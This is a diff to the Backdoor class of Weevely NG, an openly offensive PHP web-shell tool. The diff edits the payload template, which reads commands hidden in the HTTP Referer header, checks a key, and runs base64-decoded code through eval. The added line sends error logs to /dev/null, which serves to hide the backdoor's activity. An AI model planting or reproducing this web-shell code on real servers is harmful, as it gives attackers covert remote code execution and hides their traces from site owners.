@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 # This file is part of Weevely NG.
 #
 # Copyright(c) 2011-2012 Weevely Developers
@@ -19,8 +20,9 @@ import base64
 
 class Backdoor:
 	payload_template = """
-parse_str($_SERVER['HTTP_REFERER'],$a); 
-if(reset($a)=='%%%START_KEY%%%' && count($a)==9) { 
+ini_set('error_log', '/dev/null');
+parse_str($_SERVER['HTTP_REFERER'],$a);
+if(reset($a)=='%%%START_KEY%%%' && count($a)==9) {
 echo '<%%%END_KEY%%%>';
 eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
 echo '</%%%END_KEY%%%>';
